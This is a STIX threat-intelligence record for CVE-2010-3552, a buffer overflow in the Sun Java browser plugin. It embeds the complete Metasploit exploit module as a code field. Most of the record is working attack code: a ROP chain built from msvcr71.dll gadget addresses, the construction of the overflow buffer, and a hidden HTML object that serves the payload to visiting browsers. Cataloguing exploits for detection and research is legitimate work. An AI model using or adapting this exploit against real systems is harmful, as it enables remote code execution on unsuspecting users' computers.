{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ee770e95-af2f-49b7-a967-5b3463863349",
    "created": "2024-08-14T16:41:43.964384Z",
    "modified": "2024-08-14T16:41:43.964389Z",
    "name": "Sun Java Runtime New Plugin docbase Buffer Overflow",
    "description": " This module exploits a flaw in the new plugin component of the Sun Java Runtime Environment before v6 Update 22. By specifying specific parameters to the new plugin, an attacker can cause a stack-based buffer overflow and execute arbitrary code.  When the new plugin is invoked with a \"launchjnlp\" parameter, it will copy the contents of the \"docbase\" parameter to a stack-buffer using the \"sprintf\" function. A string of 396 bytes is enough to overflow the 256 byte stack buffer and overwrite some local variables as well as the saved return address.  NOTE: The string being copied is first passed through the \"WideCharToMultiByte\". Due to this, only characters which have a valid localized multibyte representation are allowed. Invalid characters will be replaced with question marks ('?').  This vulnerability was originally discovered independently by both Stephen Fewer and Berend Jan Wever (SkyLined). Although exhaustive testing hasn't been done, all versions since version 6 Update 10 are believed to be affected by this vulnerability.  This vulnerability was patched as part of the October 2010 Oracle Patch release.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/java_docbase_bof.rb",
            "external_id": "java_docbase_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-3552"
        },
        {
            "source_name": "reference",
            "url": "http://blog.harmonysecurity.com/2010/10/oracle-java-ie-browser-plugin-stack.html"
        },
        {
            "source_name": "reference",
            "url": "http://code.google.com/p/skylined/issues/detail?id=23"
        },
        {
            "source_name": "reference",
            "url": "http://skypher.com/index.php/2010/10/13/issue-2-oracle-java-object-launchjnlp-docbase/"
        },
        {
            "source_name": "reference",
            "url": "http://www.oracle.com/technetwork/topics/security/javacpuoct2010-176258.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  #\n  # This module acts as an HTTP server\n  #\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Sun Java Runtime New Plugin docbase Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a flaw in the new plugin component of the Sun Java\n        Runtime Environment before v6 Update 22. By specifying specific parameters\n        to the new plugin, an attacker can cause a stack-based buffer overflow and\n        execute arbitrary code.\n\n        When the new plugin is invoked with a \"launchjnlp\" parameter, it will\n        copy the contents of the \"docbase\" parameter to a stack-buffer using the\n        \"sprintf\" function. A string of 396 bytes is enough to overflow the 256\n        byte stack buffer and overwrite some local variables as well as the saved\n        return address.\n\n        NOTE: The string being copied is first passed through the \"WideCharToMultiByte\".\n        Due to this, only characters which have a valid localized multibyte\n        representation are allowed. Invalid characters will be replaced with\n        question marks ('?').\n\n        This vulnerability was originally discovered independently by both Stephen\n        Fewer and Berend Jan Wever (SkyLined). Although exhaustive testing hasn't\n        been done, all versions since version 6 Update 10 are believed to be affected\n        by this vulnerability.\n\n        This vulnerability was patched as part of the October 2010 Oracle Patch\n        release.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => 'jduck',\n      'References'     =>\n        [\n          [ 'CVE', '2010-3552' ],\n          [ 'OSVDB', '68873' ],\n          [ 'BID', '44023' ],\n          [ 'URL', 'http://blog.harmonysecurity.com/2010/10/oracle-java-ie-browser-plugin-stack.html' ],\n          [ 'ZDI', '10-206' ],\n          [ 'URL', 'http://code.google.com/p/skylined/issues/detail?id=23' ],\n          [ 'URL', 'http://skypher.com/index.php/2010/10/13/issue-2-oracle-java-object-launchjnlp-docbase/' ],\n          [ 'URL', 'http://www.oracle.com/technetwork/topics/security/javacpuoct2010-176258.html' ],\n        ],\n      'Platform'       => 'win',\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 1024,\n          # The double quote is due to the html, the rest due to utf8 conversion crap.\n          'BadChars' => \"\\x00\\x22\" + (0x80..0x9f).to_a.pack('C*'),\n          'DisableNops' => true,\n          #'EncoderType'    => Msf::Encoder::Type::AlphanumMixed,\n          'EncoderOptions' =>\n            {\n              'BufferRegister' => 'EAX',\n            }\n        },\n      'Targets'        =>\n        [\n          # Tested OK on:\n          # JRE 6u21 on XPSP3 and Win7-RTM\n          # JRE 6u18 on XPSP3 (ugly dialog on IE8)\n          # JRE 6u11 on XPSP3 (ugly dialog on IE8)\n          [ 'Windows Universal (msvcr71.dll ROP)', { } ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2010-10-12'\n      ))\n  end\n\n  def on_request_uri(cli, request)\n\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    print_status(\"Sending exploit HTML\")\n\n    # ActiveX params\n    clsid = 'CAFEEFAC-DEC7-0000-0000-ABCDEFFEDCBA'\n    var_obj = rand_text_alpha(8+rand(8))\n\n\n    # These addresses are from the bundled msvcr71.dll from JRE 6u21\n=begin\n7c340000 7c396000   MSVCR71    (export symbols)       C:\\Program Files\\Java\\jre6\\bin\\MSVCR71.dll\nLoaded symbol image file: C:\\Program Files\\Java\\jre6\\bin\\MSVCR71.dll\nImage path: C:\\Program Files\\Java\\jre6\\bin\\MSVCR71.dll\nImage name: MSVCR71.dll\nTimestamp:        Fri Feb 21 07:42:20 2003 (3E561EAC)\nCheckSum:         0005F1E9\nImageSize:        00056000\nFile version:     7.10.3052.4\nProduct version:  7.10.3052.4\n=end\n\n    base = 0x7c340000\n    rva = {\n      'scratch'     => 0x4b170, # Scratch space..\n      'scratch2'    => 0x4b170 - 0x10, # Scratch space..\n      'import_VA'   => 0x3a08c - 0x58, # The import address of HeapCreate (less 0x58, avoid badchars)\n      'add_58_eax'  => 0xd05e,  # add eax, 0x58 / ret\n      'pop_eax'     => 0x4cc1,  # pop eax / ret\n      'deref_eax'   => 0x130ea, # mov eax, [eax] / ret\n      'deref_eax4'  => 0xe72b,  # mov eax, [eax+4] / ret\n      'jmp_eax'     => 0x13ac,  # push eax / ret\n      'jmp_ecx'     => 0x6b0e,  # jmp ecx\n      'pop_edx'     => 0x5937,  # pop edx / ret\n      'adjust_eax'  => 0x32ef8, # add eax, 0x80bf / add dh, dh / ret\n      'rep_movsd'   => 0x363f,  # rep movsd / pop edi / pop esi / sub eax, eax / ret\n      'esp_to_esi'  => 0x32f4f, # push esp / and al, 0x10 / mov [edx], ecx / pop esi / ret\n      'switcheroo'  => 0x3427,  # mov ecx, eax / mov eax, esi / pop esi / ret 0x10\n      'st_eax_ecx'  => 0x103c8, # mov [ecx], eax / ret\n      'xor_ecx'     => 0x1aa5f, # xor ecx, ecx / mov [eax+0xc], ecx / ret 4\n      'set_ecx_fd'  => 0x1690b, # mov cl, 0xfe / dec ecx / ret\n    }\n\n    extra_insn = 'nop'\n    #extra_insn = 'int 3'\n    single_op = Metasm::Shellcode.assemble(Metasm::Ia32.new, <<-EOS).encode_string\n  #{extra_insn}\n  push ecx\n  pop edi\n  ret\nEOS\n\n    # This is the ROP stack.\n    stack = [\n      # Load HeapCreate addr from IAT\n      'pop_eax',\n      0x41414141,     # unused space..\n      0x41414141,\n      0x41414141,\n      0x41414141,\n      'import_VA',    # becomes eax\n      'add_58_eax',\n      'deref_eax',\n\n      # call HeapCreate\n      'jmp_eax',\n      'adjust_eax',   # eip after HeapCreate\n      0x01040110,     # flOptions (gets & with 0x40005)\n      0x01010101,     # dwInitialSize\n      0x01010101,     # dwMaximumSize\n\n      # Move esp into esi\n      'pop_edx',\n      'scratch',      # becomes edx\n      'esp_to_esi',\n\n      # Store a single-dword stub to our buffer\n      'switcheroo',\n      single_op.unpack('V').first,  # becomes esi/eax\n      'deref_eax4',\n      0x41414141,     # more unused space..\n      0x41414141,\n      0x41414141,\n      0x41414141,\n      'st_eax_ecx',\n\n      # Call our dword-stub\n      'jmp_ecx',\n\n      # Re-load ESP and save our Heap address to scratch (edx)\n      'esp_to_esi',\n\n      # Set ecx to something sane (for memcpy)\n      'pop_eax',\n      'scratch2',\n      'xor_ecx',\n      'set_ecx_fd',\n      0x41414141,     # skipped by ret 0x4\n\n      # Do the memcpy!\n      'rep_movsd',\n      0x41414141,     # becomes edi\n      0x41414141,     # becomes esi\n\n      # Re-load our Heap pointer\n      'pop_eax',\n      'scratch',\n      'deref_eax',\n\n      # Adjust it to skip the non-payload parts\n      'add_58_eax',\n\n      # Execute it !\n      'jmp_eax',\n\n      # BOOO!\n      0x41414141\n    ]\n\n    # Replace unused entries with randomness\n    stack = stack.map { |el|\n      if el.kind_of? String\n        base + rva[el]\n      elsif el == 0x41414141\n        rand_text(4).unpack('V').first\n      else\n        el\n      end\n    }.pack('V*')\n\n\n    # Create the overflow buffer\n    docbase = rand_text(392)\n    docbase << stack\n    docbase << rand_text(584 - docbase.length)\n    docbase << payload.encoded\n\n    # Generate the html page that will trigger the vuln.\n    html = <<-EOS\n<html>\n<body>Please wait...\n<object id=\"#{var_obj}\" classid=\"clsid:#{clsid}\" width=\"0\" height=\"0\">\n<PARAM name=\"launchjnlp\" value=\"1\">\n<PARAM name=\"docbase\" value=\"#{docbase}\">\n</object>\n<embed type=\"application/x-java-applet\" width=\"0\" height=\"0\" launchjnlp=\"1\" docbase=\"#{docbase}\" />\n</body>\n</html>\nEOS\n\n    # Pow.\n    send_response_html(cli, html,\n      {\n        'Content-Type' => 'text/html',\n        'Pragma' => 'no-cache'\n      })\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-10-12",
    "x_mitre_platforms": [
        "win'"
    ]
}